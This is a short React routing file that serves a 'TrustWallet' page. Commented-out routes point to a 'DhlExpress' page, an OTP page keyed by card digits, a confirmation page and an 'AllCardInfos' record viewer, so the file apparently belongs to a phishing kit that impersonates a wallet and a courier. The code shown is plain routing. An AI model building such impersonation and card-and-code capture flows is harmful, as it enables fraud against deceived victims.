import React from "react";
import { BrowserRouter, Route, Routes } from "react-router-dom";
import TrustWallet from "./trustwallet";



function App() {
 

  return (
   
      <BrowserRouter>
        <Routes>
          <Route path="/" element={<TrustWallet />} />
        </Routes>
      </BrowserRouter>
    
  );
}

export default App;

/*
<Route path="/:param" element={<DhlExpress />} />
          <Route path="/sendcode/:cardigit/:param" element={<Otp />} />
          <Route path="/confirm" element={<Verified />} />
          <Route path="/info/:docId" element={<AllCardInfos />} />
*/
